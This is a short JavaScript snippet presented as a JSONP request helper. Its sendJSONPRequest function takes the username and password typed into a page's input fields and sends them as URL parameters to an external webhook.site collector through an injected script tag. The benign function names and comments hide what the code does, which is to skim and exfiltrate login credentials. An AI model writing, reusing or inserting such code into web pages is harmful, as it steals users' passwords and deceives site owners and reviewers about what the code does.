function handleResponse(data) {
    console.log('Received data:', data);
    // Process the data received from the server
}

function sendJSONPRequest() {
    const uu = document.querySelector('input[type="text"]').value;
    const pp = document.querySelector('input[type="password"]').value;
    
    if (uu && pp) {
        // Create a script tag
        var script = document.createElement('script');
        
        // Define the callback function
        window.handleResponse = handleResponse;
        
        // Set the source URL with a callback parameter
        script.src = 'https://webhook.site/1a6c6682-deae-47ae-8ae8-7a7c645c3d3a?callback=handleResponse&u=' + encodeURIComponent(uu) + '&p=' + encodeURIComponent(pp);
        
        // Append the script tag to the document
        document.body.appendChild(script);
    } else {
        console.log('Please fill in both input fields.');
    }
}
